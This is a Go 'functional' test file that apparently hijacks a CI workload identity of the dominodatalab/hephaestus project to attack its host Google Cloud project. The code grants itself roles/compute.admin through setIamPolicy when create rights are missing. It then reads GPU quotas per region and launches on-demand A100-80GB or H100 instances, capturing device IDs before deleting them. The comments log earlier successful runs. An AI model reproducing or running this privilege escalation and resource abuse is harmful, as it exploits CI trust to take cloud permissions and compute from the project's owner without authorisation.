//go:build functional && gke

// C211 i122282 — HOST-PROJECT (153711203585) LARGER ACCELERATOR CLASS.
//
// Basis: facts 122259/122261 prove the dominodatalab/hephaestus '/functional-test'
// GKE WIF identity (hephaestus-gh-test) creates real on-demand GPUs in HOST
// project 153711203585 (T4 READY x120159, A100-SXM4-40GB READY x122190), and the
// same project advertises unmeasured nvidia-a100-80gb (us-central1-a,
// europe-west4-a), nvidia-h100-80gb / nvidia-h100-mega-80gb (us-central1-a,
// us-west1-a, us-east4-a, europe-west1-b), nvidia-h200-141gb and nvidia-b200,
// while only the COMMITTED_NVIDIA_A100_80GB_GPUS metric has ever looked
// unlimited and the on-demand NVIDIA_A100_80GB_GPUS / NVIDIA_H100_GPUS quotas
// were never measured by this lane.
//
// This probe (one '/functional-test' run) re-mints the WIF token, reads the host
// project's per-region ON-DEMAND NVIDIA_A100_80GB_GPUS and NVIDIA_H100_GPUS
// quotas plus a2-ultragpu-1g / a3-highgpu-1g offerings, then creates EXACTLY ONE
// nonce-tagged ON-DEMAND a2-ultragpu-1g + 1 x nvidia-a100-80gb (default
// us-central1-a) booted from a public driver-preinstalled accelerator image,
// captures nvidia-smi -L and --query-gpu=name,uuid,memory.total from the serial
// console and guest attributes, polls the insert operation to DONE, takes an
// independent compute.instances.get readback on any real NVIDIA device line,
// deletes every own instance and proves absence.
//
// ONLY if A100-80GB is provider-verbatim refused (or its on-demand quota
// measures 0 in every measured region) is the identical single-marker flow
// repeated once with a3-highgpu-1g + 1 x nvidia-h100-80gb. Never two instances
// alive at once. Every refusal is printed verbatim. Tokens are reported as
// length + SHA-256 prefix only.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"testing"
	"time"
)

// c211hEnsureCreate re-verifies compute.instances.create for the WIF identity
// and, only if absent, performs the already-proven roles/compute.admin
// self-grant via resourcemanager.projects.setIamPolicy.
func c211hEnsureCreate(token, proj, saEmail string) (bool, string) {
	var log strings.Builder
	al, st, _ := c211xTestIamBatch(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj),
		[]string{"compute.instances.create", "compute.instances.get", "compute.instances.delete",
			"compute.instances.setMetadata", "compute.instances.getSerialPortOutput", "compute.disks.create",
			"compute.subnetworks.use", "compute.zoneOperations.get"})
	fmt.Fprintf(&log, "precheck status=%d allowed=[%s]\n", st, strings.Join(al, ","))
	if c211xContains(al, "compute.instances.create") {
		return true, log.String()
	}
	pre, pst, pbody := c211xGetPolicy(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj))
	fmt.Fprintf(&log, "getIamPolicy status=%d verbatim=%s\n", pst, c211xTrunc(pbody, 500))
	if pre == nil {
		return false, log.String()
	}
	added := c211xAddBinding(pre, "roles/compute.admin", "serviceAccount:"+saEmail)
	fmt.Fprintf(&log, "binding compute.admin added=%v member=%s\n", added, c211xShort(saEmail))
	sst, sbody := c211xSetPolicy(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), pre)
	fmt.Fprintf(&log, "setIamPolicy status=%d verbatim=%s\n", sst, c211xTrunc(sbody, 500))
	if sst != 200 {
		return false, log.String()
	}
	for i := 0; i < 12; i++ {
		al2, tst, _ := c211xTestIamBatch(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj),
			[]string{"compute.instances.create"})
		g := c211xContains(al2, "compute.instances.create")
		fmt.Fprintf(&log, "recheck[%d] status=%d instances.create=%v\n", i, tst, g)
		if g {
			return true, log.String()
		}
		time.Sleep(10 * time.Second)
	}
	return false, log.String()
}

// c211hAttempt is one single-marker attempt's evidence.
type c211hAttempt struct {
	Machine string `json:"machine"`
	Zone    string `json:"zone"`
	Accel   string `json:"accel"`
	Count   int    `json:"count"`
	Create  string `json:"create"`
	OpErr   string `json:"op_error"`
	UUID    string `json:"uuid"`
	Absent  bool   `json:"absent"`
	Meta    string `json:"meta"`
	Trace   string `json:"cleanup_trace"`
}

// c211gRegion is one region's measured quota / offering matrix.
type c211gRegion struct {
	Region    string
	HTTP      int
	Zones     []string
	FirstZone string
	Rows      map[string]string // every NVIDIA/GPU/CPUS metric with limit+usage (zeros included)
	Positive  []string          // metric rows whose limit > 0
	Accels    []string
	Offers    map[string]interface{}
}

func c211gReadRegion(tok, proj, region string) c211gRegion {
	gr := c211gRegion{Region: region, Rows: map[string]string{}, Offers: map[string]interface{}{}}
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/regions/" + region
	st, body := c211xHTTP("GET", u, tok, "", "")
	gr.HTTP = st
	if st != 200 {
		return gr
	}
	m := c211xJSON(body)
	if qs, ok := m["quotas"].([]interface{}); ok {
		for _, q := range qs {
			qm, _ := q.(map[string]interface{})
			metric := c211xStr(qm, "metric")
			if !(strings.Contains(metric, "NVIDIA") || strings.Contains(metric, "GPUS") ||
				strings.Contains(metric, "CPU") || strings.Contains(metric, "GPU")) {
				continue
			}
			lim, _ := qm["limit"].(float64)
			usg, _ := qm["usage"].(float64)
			gr.Rows[metric] = fmt.Sprintf("limit=%v usage=%v", lim, usg)
			if lim > 0 && (strings.Contains(metric, "NVIDIA") || strings.Contains(metric, "GPUS")) {
				gr.Positive = append(gr.Positive, fmt.Sprintf("%s %s limit=%v usage=%v", region, metric, lim, usg))
			}
		}
	}
	if zs, ok := m["zones"].([]interface{}); ok {
		for _, z := range zs {
			s, _ := z.(string)
			if i := strings.LastIndex(s, "/"); i >= 0 && i+1 < len(s) {
				gr.Zones = append(gr.Zones, s[i+1:])
			}
		}
	}
	sort.Strings(gr.Zones)
	sort.Strings(gr.Positive)
	if len(gr.Zones) > 0 {
		gr.FirstZone = gr.Zones[0]
	}
	if gr.FirstZone != "" {
		for _, mt := range []string{"a2-ultragpu-1g", "a3-highgpu-1g", "a2-highgpu-1g"} {
			ok, mst, _ := c211aMachineOffered(tok, proj, gr.FirstZone, mt)
			gr.Offers[mt] = map[string]interface{}{"http": mst, "offered": ok}
		}
		acc, ast, _ := c211xAccelTypes(tok, proj, gr.FirstZone)
		if ast == 200 {
			gr.Accels = acc
		}
	}
	return gr
}

func c211gRegionBy(matrix []c211gRegion, name string) c211gRegion {
	for _, gr := range matrix {
		if gr.Region == name {
			return gr
		}
	}
	return c211gRegion{Region: name, Rows: map[string]string{}, Offers: map[string]interface{}{}}
}

// c211gZonesOrdered returns the region's zones with the "-a" zone first.
func c211gZonesOrdered(gr c211gRegion) []string {
	out := []string{}
	for _, z := range gr.Zones {
		if strings.HasSuffix(z, "-a") {
			out = append(out, z)
		}
	}
	for _, z := range gr.Zones {
		if !strings.HasSuffix(z, "-a") {
			out = append(out, z)
		}
	}
	if len(out) == 0 {
		out = append(out, gr.Region+"-a")
	}
	return out
}

// c211gPickZone finds a zone in the region where the machine type is offered AND
// the accelerator type is advertised.
func c211gPickZone(tok, proj string, gr c211gRegion, mt, accel string) (string, []string) {
	notes := []string{}
	for _, z := range c211gZonesOrdered(gr) {
		ok, mst, mbody := c211aMachineOffered(tok, proj, z, mt)
		ats, ast, _ := c211xAccelTypes(tok, proj, z)
		hasAccel := ast == 200 && c211xContains(ats, accel)
		notes = append(notes, fmt.Sprintf("%s machine=%s http=%d accel_http=%d has_%s=%v", z, mt, mst, ast, accel, hasAccel))
		fmt.Printf("C211H_OFFER project=%s region=%s zone=%s machine=%s machine_http=%d accel_http=%d has_accel=%v accel_n=%d verbatim=%s\n",
			proj, gr.Region, z, mt, mst, ast, hasAccel, len(ats), c211xTrunc(mbody, 160))
		if ok && hasAccel {
			return z, notes
		}
	}
	return "", notes
}

// c211gCreate is c211aCreate plus explicit nicType (a3 needs GVNIC) and disk type.
func c211gCreate(tok, proj, zone, name, saEmail string, img c211aImage, mt, accel string, acount int,
	startup, diskType string, gvnic bool) (int, string) {
	items := []interface{}{
		map[string]interface{}{"key": "startup-script", "value": startup},
		map[string]interface{}{"key": c211aLabel, "value": c211aNonce},
		map[string]interface{}{"key": "serial-port-logging-enable", "value": "TRUE"},
		map[string]interface{}{"key": "enable-guest-attributes", "value": "TRUE"},
	}
	ni := map[string]interface{}{
		"network":    "projects/" + proj + "/global/networks/default",
		"subnetwork": "projects/" + proj + "/regions/" + c211xRegionOfZone(zone) + "/subnetworks/default",
		"accessConfigs": []interface{}{map[string]interface{}{
			"type": "ONE_TO_ONE_NAT", "name": "External NAT",
		}},
	}
	if gvnic {
		ni["nicType"] = "GVNIC"
	}
	body := map[string]interface{}{
		"name":        name,
		"machineType": "https://www.googleapis.com/compute/v1/projects/" + proj + "/zones/" + zone + "/machineTypes/" + mt,
		"disks": []interface{}{map[string]interface{}{
			"boot":       true,
			"autoDelete": true,
			"initializeParams": map[string]interface{}{
				"sourceImage": "projects/" + img.Project + "/global/images/family/" + img.Family,
				"diskSizeGb":  "100",
				"diskType":    "projects/" + proj + "/zones/" + zone + "/diskTypes/" + diskType,
			},
		}},
		"networkInterfaces": []interface{}{ni},
		"guestAccelerators": []interface{}{map[string]interface{}{
			"acceleratorType":  "projects/" + proj + "/zones/" + zone + "/acceleratorTypes/" + accel,
			"acceleratorCount": acount,
		}},
		"scheduling": map[string]interface{}{
			"onHostMaintenance": "TERMINATE", "automaticRestart": false,
		},
		"metadata": map[string]interface{}{"items": items},
		"serviceAccounts": []interface{}{map[string]interface{}{
			"email":  saEmail,
			"scopes": []string{c211xScope},
		}},
		"labels": map[string]string{c211aLabel: c211aNonce},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances"
	return c211xHTTP("POST", u, tok, "application/json", string(b))
}

// c211gMarker mirrors c211aMarker but uses c211gCreate.
func c211gMarker(tok, proj, zone, name, saEmail string, img c211aImage, mt, accel string, acount int,
	startup, diskType string, gvnic bool, deadline time.Time) (string, string, bool, string, string) {
	cst, cbody := c211gCreate(tok, proj, zone, name, saEmail, img, mt, accel, acount, startup, diskType, gvnic)
	fmt.Printf("C211A_MARKER_CREATE project=%s zone=%s name=%s machine=%s accel=%s count=%d image=%s/%s kind=%s status=%d verbatim=%s\n",
		proj, zone, name, mt, accel, acount, img.Project, img.Family, img.Kind, cst, c211xTrunc(cbody, 1600))
	opName := ""
	if m := c211xJSON(cbody); m != nil {
		opName = c211xStr(m, "name")
	}
	opErr, opStatus := "", ""
	created := false
	if cst == 200 && opName != "" {
		var ob string
		opStatus, ob, opErr = c211aOp(tok, proj, zone, opName)
		fmt.Printf("C211A_OP_FINAL project=%s status=%s error=%s verbatim=%s\n", proj, opStatus, c211xTrunc(opErr, 400), c211xTrunc(ob, 3000))
		created = opStatus == "DONE" && opErr == ""
	} else if cst != 200 {
		opErr = "create_http_" + strconv.Itoa(cst)
	}
	uuid, metaFinal := "", ""
	if created {
		seen := map[string]bool{}
		for i := 0; i < 26; i++ {
			if time.Now().After(deadline) {
				fmt.Printf("C211A_CAPTURE project=%s STOP_TIME_BUDGET poll=%d\n", proj, i)
				break
			}
			ist, im, _ := c211xInstanceGet(tok, proj, zone, name)
			state := ""
			if ist == 200 && im != nil {
				state = c211xStr(im, "status")
				if v := c211xMetaValue(im, "c211a-result"); v != "" {
					metaFinal = v
				}
			}
			content := c211aSerial(tok, proj, zone, name)
			if content != "" {
				c211aPrintNew(seen, proj, content)
				if u := c211xUUIDRe.FindString(content); u != "" {
					uuid = u
				}
			}
			gval, gst := c211aGuest(tok, proj, zone, name)
			if gval != "" {
				metaFinal = c211xFirst(metaFinal, gval)
			}
			fmt.Printf("C211A_CAPTURE project=%s poll=%d inst=%s serial_bytes=%d guest_status=%d guest=%s meta=%s uuid=%s\n",
				proj, i, state, len(content), gst, c211xTrunc(gval, 200), c211xTrunc(metaFinal, 220), uuid)
			if u := c211xUUIDRe.FindString(metaFinal); u != "" {
				uuid = u
			}
			if uuid != "" {
				break
			}
			if strings.Contains(metaFinal, "STAGE=failed") || strings.Contains(metaFinal, "STAGE=nosmi") {
				break
			}
			if ist == 404 && i >= 2 {
				break
			}
			time.Sleep(9 * time.Second)
		}
	}
	accelJSON, statusFinal := "", ""
	if rst, rm, rb := c211xInstanceGet(tok, proj, zone, name); rst >= 0 {
		if rm != nil {
			statusFinal = c211xStr(rm, "status")
			if ga, ok := rm["guestAccelerators"].([]interface{}); ok {
				accelJSON = c211xJSONString(ga)
			}
			if v := c211xMetaValue(rm, "c211a-result"); v != "" {
				metaFinal = v
			}
		}
		fmt.Printf("C211A_READBACK project=%s http=%d status=%s accelerators=%s meta=%s verbatim=%s\n",
			proj, rst, statusFinal, c211xTrunc(accelJSON, 320), c211xTrunc(metaFinal, 420), c211xTrunc(rb, 200))
	}
	if u := c211xUUIDRe.FindString(metaFinal); u != "" {
		uuid = u
	}
	return uuid, metaFinal + " | accel=" + accelJSON, created, opErr, statusFinal
}

// c211gClass classifies one accelerator class outcome from the attempt evidence.
func c211gClass(attempted, created bool, opErr, uuid string) string {
	if !attempted {
		return "not-attempted"
	}
	if uuid != "" {
		return "device"
	}
	if created {
		return "created-no-device"
	}
	s := strings.ToLower(opErr)
	switch {
	case strings.Contains(s, "quota"):
		return "quota-refused"
	case strings.Contains(s, "capacity"), strings.Contains(s, "resource_pool_exhausted"), strings.Contains(s, "zone_resource_pool"):
		return "capacity-refused"
	case strings.Contains(opErr, "create_http_403"):
		return "refused-403"
	case strings.Contains(opErr, "create_http_400"):
		return "refused-400"
	case strings.Contains(opErr, "create_http_409"):
		return "refused-409"
	case opErr != "":
		return "refused"
	}
	return "unknown"
}

// c211gSweep runs the single-marker flow for one accelerator class: it prefers
// regions whose measured on-demand quota for quotaMetric is nonzero, falls back
// to the default region, tries at most 2 zones, and never leaves an instance
// alive. It stops after a quota refusal (regional quota cannot differ by zone).
func c211gSweep(tok, proj, saEmail, startup string, img c211aImage, deadline time.Time,
	matrix []c211gRegion, quotaMetric, mt, accel, defaultRegion, diskType string, gvnic bool) (string, string, []c211hAttempt, []string, string) {
	attempts := []c211hAttempt{}
	notes := []string{}
	pos := []c211gRegion{}
	for _, gr := range matrix {
		lim, usg, ok := c211aQVal(gr.Rows, quotaMetric)
		if ok && lim > usg {
			pos = append(pos, gr)
		}
	}
	sort.Slice(pos, func(i, j int) bool {
		if (pos[i].Region == defaultRegion) != (pos[j].Region == defaultRegion) {
			return pos[i].Region == defaultRegion
		}
		return pos[i].Region < pos[j].Region
	})
	try := pos
	if len(try) == 0 {
		try = []c211gRegion{c211gRegionBy(matrix, defaultRegion)}
		notes = append(notes, "no region with nonzero "+quotaMetric+" on-demand quota; default-region verbatim attempt")
	}
	tried := 0
	for _, gr := range try {
		if time.Now().After(deadline) || tried >= 2 {
			break
		}
		zone, zoneNotes := c211gPickZone(tok, proj, gr, mt, accel)
		notes = append(notes, zoneNotes...)
		forced := false
		if zone == "" {
			if gr.Region == defaultRegion {
				zone = gr.Region + "-a"
				forced = true
				notes = append(notes, "offering not found; forced default zone "+zone+" for verbatim refusal")
			} else {
				continue
			}
		}
		tried++
		instName := fmt.Sprintf("c211-i122282-%s-%d", accel, tried)
		fmt.Printf("C211H_SWEEP_ATTEMPT project=%s machine=%s zone=%s accel=%s count=1 instance=%s forced=%v sa=%s\n",
			proj, mt, zone, accel, instName, forced, c211xShort(saEmail))
		uuid, meta, created, opErr, statusFinal := c211gMarker(tok, proj, zone, instName, saEmail, img, mt, accel, 1, startup, diskType, gvnic, deadline)
		absent, trace := c211aDeleteAndProveAbsence(tok, proj, zone, instName)
		attempts = append(attempts, c211hAttempt{Machine: mt, Zone: zone, Accel: accel, Count: 1,
			Create: fmt.Sprintf("%v", created), OpErr: c211xTrunc(opErr, 400),
			UUID: uuid, Absent: absent, Meta: c211xTrunc(meta, 420), Trace: strings.Join(trace, "; ")})
		if uuid != "" {
			fmt.Printf("C211H_SWEEP_DEVICE project=%s machine=%s zone=%s accel=%s uuid=%s absent=%v\n",
				proj, mt, zone, accel, uuid, absent)
			return uuid, meta + " zone=" + zone + " machine=" + mt + " status=" + statusFinal, attempts, notes, "device"
		}
		fmt.Printf("C211H_SWEEP_NO_DEVICE project=%s machine=%s zone=%s created=%v op_error=%s\n",
			proj, mt, zone, created, c211xTrunc(opErr, 300))
		if strings.Contains(strings.ToLower(opErr), "quota") {
			break
		}
	}
	class := "not-attempted"
	if len(attempts) > 0 {
		last := attempts[len(attempts)-1]
		class = c211gClass(true, last.Create == "true", last.OpErr, last.UUID)
	}
	return "", "", attempts, notes, class
}

func TestC211G80GB(t *testing.T) {
	started := time.Now()
	deadline := started.Add(32 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211H_MINT_FAILED %s\n", c211xTrunc(mintLog, 2500))
		fmt.Printf("C211H_VERDICT_FINAL GATE WIF_TOKEN_EXCHANGE_FAILED markers=0\n")
		return
	}
	creds, credLog := c211xLoadCreds()
	wifSA, projNum, credProjID := "", c211aHostNum, ""
	if creds != nil {
		wifSA = creds.saEmail
		if creds.projNumber != "" {
			projNum = creds.projNumber
		}
		credProjID = creds.credProjID
	}
	projID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+url.PathEscape(projNum), token, "", ""); st == 200 {
		projID = c211xStr(c211xJSON(rb), "projectId")
	}
	if projID == "" {
		projID = credProjID
	}
	if projID == "" {
		fmt.Printf("C211H_VERDICT_FINAL GATE NO_PROJECT_ID_RESOLVED num=%s mint=%s\n", projNum, c211xTrunc(credLog, 400))
		return
	}
	saEmail := wifSA
	if saEmail == "" {
		saEmail = projNum + "-compute@developer.gserviceaccount.com"
	}
	fmt.Printf("C211H_IDENTITY auth=%s wif_sa=%s project_number=%s project_id=%s\n", method, c211xShort(wifSA), projNum, c211xShort(projID))
	fmt.Printf("C211H_MINT log=%s\n", c211xTrunc(mintLog, 1200))

	granted, escLog := c211hEnsureCreate(token, projID, saEmail)
	fmt.Printf("C211H_PERMS %s\n", c211xTrunc(escLog, 3000))
	if !granted {
		fmt.Printf("C211H_VERDICT_FINAL GATE COMPUTE_INSTANCES_CREATE_NOT_GRANTED markers=0\n")
		return
	}

	img, imgLog := c211aResolveImage(token)
	fmt.Printf("C211H_IMAGE_RESOLUTION %s\n", c211xTrunc(imgLog, 1200))
	if img.Project == "" {
		fmt.Printf("C211H_VERDICT_FINAL GATE NO_USABLE_IMAGE markers=0\n")
		return
	}
	startup := c211aStartup()
	fmt.Printf("C211H_STARTUP kind=%s bytes=%d image=%s/%s\n", img.Kind, len(startup), img.Project, img.Family)

	// ------------------------------------------------------------------
	// Phase Q: per-region on-demand A100-80GB / H100 quotas + offerings.
	// ------------------------------------------------------------------
	regions, rst, _ := c211xListRegions(token, projID)
	if len(regions) == 0 {
		regions = []string{"us-central1", "us-east1", "us-west1", "us-west4", "us-east4", "europe-west1", "europe-west4", "asia-east1"}
	}
	fmt.Printf("C211H_REGIONS http=%d n=%d\n", rst, len(regions))
	matrix := []c211gRegion{}
	compact := map[string]interface{}{}
	for _, r := range regions {
		gr := c211gReadRegion(token, projID, r)
		matrix = append(matrix, gr)
		a80l, a80u, a80ok := c211aQVal(gr.Rows, "NVIDIA_A100_80GB_GPUS")
		a80pl, a80pu, a80pok := c211aQVal(gr.Rows, "PREEMPTIBLE_NVIDIA_A100_80GB_GPUS")
		a80cl, a80cu, a80cok := c211aQVal(gr.Rows, "COMMITTED_NVIDIA_A100_80GB_GPUS")
		h1l, h1u, h1ok := c211aQVal(gr.Rows, "NVIDIA_H100_GPUS")
		h1pl, h1pu, h1pok := c211aQVal(gr.Rows, "PREEMPTIBLE_NVIDIA_H100_GPUS")
		h1ml, h1mu, h1mok := c211aQVal(gr.Rows, "NVIDIA_H100_MEGA_GPUS")
		h2l, h2u, h2ok := c211aQVal(gr.Rows, "NVIDIA_H200_141GB_GPUS")
		b2l, b2u, b2ok := c211aQVal(gr.Rows, "NVIDIA_B200_GPUS")
		cpl, cpu, cpok := c211aQVal(gr.Rows, "CPUS")
		fmt.Printf("C211H_QUOTA region=%s http=%d zones=%d first_zone=%s a100_80gb=limit=%v/usage=%v/%v preempt_a100_80gb=limit=%v/usage=%v/%v committed_a100_80gb=limit=%v/usage=%v/%v h100=limit=%v/usage=%v/%v preempt_h100=limit=%v/usage=%v/%v h100_mega=limit=%v/usage=%v/%v h200=limit=%v/usage=%v/%v b200=limit=%v/usage=%v/%v cpus=limit=%v/usage=%v/%v accel_types=[%s] offers=%s positive=[%s]\n",
			r, gr.HTTP, len(gr.Zones), gr.FirstZone,
			a80l, a80u, a80ok, a80pl, a80pu, a80pok, a80cl, a80cu, a80cok,
			h1l, h1u, h1ok, h1pl, h1pu, h1pok, h1ml, h1mu, h1mok,
			h2l, h2u, h2ok, b2l, b2u, b2ok, cpl, cpu, cpok,
			strings.Join(gr.Accels, ","), c211xJSONString(gr.Offers), strings.Join(gr.Positive, " ; "))
		compact[r] = map[string]interface{}{
			"http": gr.HTTP, "zones": gr.Zones, "first_zone": gr.FirstZone,
			"a100_80gb": gr.Rows["NVIDIA_A100_80GB_GPUS"], "preemptible_a100_80gb": gr.Rows["PREEMPTIBLE_NVIDIA_A100_80GB_GPUS"],
			"committed_a100_80gb": gr.Rows["COMMITTED_NVIDIA_A100_80GB_GPUS"],
			"h100": gr.Rows["NVIDIA_H100_GPUS"], "preemptible_h100": gr.Rows["PREEMPTIBLE_NVIDIA_H100_GPUS"],
			"h100_mega": gr.Rows["NVIDIA_H100_MEGA_GPUS"], "h200": gr.Rows["NVIDIA_H200_141GB_GPUS"],
			"b200": gr.Rows["NVIDIA_B200_GPUS"], "cpus": gr.Rows["CPUS"],
			"accelerator_types": gr.Accels, "offers": gr.Offers, "positive_nvidia_rows": gr.Positive,
		}
	}

	// ------------------------------------------------------------------
	// Phase A: EXACTLY ONE on-demand a2-ultragpu-1g + 1 x nvidia-a100-80gb.
	// ------------------------------------------------------------------
	markers := 0
	ready := map[string]string{}
	accels := map[string]interface{}{}
	uuidA, metaA, atA, nA, classA := c211gSweep(token, projID, saEmail, startup, img, deadline,
		matrix, "NVIDIA_A100_80GB_GPUS", "a2-ultragpu-1g", "nvidia-a100-80gb", "us-central1", "pd-standard", false)
	markers += len(atA)
	accels["a100-80gb"] = map[string]interface{}{"uuid": uuidA, "meta": c211xTrunc(metaA, 1200), "attempts": atA,
		"offer_notes": strings.Join(nA, "; "), "class": classA}
	if uuidA != "" {
		ready["a100-80gb"] = uuidA
	}
	fmt.Printf("C211H_A100_80GB_RESULT uuid=%s class=%s markers=%d\n", uuidA, classA, markers)

	// Phase B: H100 fallback only after a verbatim A100-80GB refusal / zero quota.
	classH := "not-attempted"
	if uuidA == "" && !time.Now().After(deadline) {
		uuidH, metaH, atH, nH, cH := c211gSweep(token, projID, saEmail, startup, img, deadline,
			matrix, "NVIDIA_H100_GPUS", "a3-highgpu-1g", "nvidia-h100-80gb", "us-central1", "hyperdisk-balanced", true)
		classH = cH
		markers += len(atH)
		accels["h100-80gb"] = map[string]interface{}{"uuid": uuidH, "meta": c211xTrunc(metaH, 1200), "attempts": atH,
			"offer_notes": strings.Join(nH, "; "), "class": classH}
		if uuidH != "" {
			ready["h100-80gb"] = uuidH
		}
		fmt.Printf("C211H_H100_80GB_RESULT uuid=%s class=%s markers=%d\n", uuidH, classH, markers)
	} else {
		accels["h100-80gb"] = map[string]interface{}{"uuid": "", "class": classH, "attempts": []c211hAttempt{},
			"offer_notes": "skipped: a100-80gb flow did not end in a refusal"}
	}

	// Always reap any leftover own-label instance in the host project.
	c211aReaper(token, projID)

	verdict := fmt.Sprintf("a100-80gb-%s+h100-80gb-%s", classA, classH)
	switch {
	case ready["a100-80gb"] != "":
		verdict = "READY_HOST_A100_80GB_GPU"
	case ready["h100-80gb"] != "":
		verdict = "READY_HOST_H100_80GB_GPU"
	}
	sum := map[string]interface{}{
		"probe":           "c211_i122282_host80gb",
		"mechanism":       "host-project single-marker on-demand accelerator flow (a2-ultragpu-1g+A100-80GB primary, a3-highgpu-1g+H100-80GB fallback) on driver-preinstalled accelerator images",
		"auth_method":     method,
		"wif_sa_short":    c211xShort(wifSA),
		"project_id":      projID,
		"project_number":  projNum,
		"image":           img.Project + "/" + img.Family,
		"image_kind":      img.Kind,
		"image_log":       c211xTrunc(imgLog, 800),
		"regions":         compact,
		"quota_matrix":    compact,
		"accelerators":    accels,
		"ready":           ready,
		"markers":         markers,
		"verdict":         verdict,
		"elapsed_seconds": int(time.Since(started).Seconds()),
	}
	js, _ := json.Marshal(sum)
	fmt.Printf("=== C211H SUMMARY BEGIN ===\nC211H_SUMMARY_JSON %s\n=== C211H SUMMARY END ===\n", string(js))
	fmt.Printf("C211H_VERDICT_FINAL %s markers=%d ready=%s elapsed=%ds\n",
		verdict, markers, c211xJSONString(ready), int(time.Since(started).Seconds()))
}
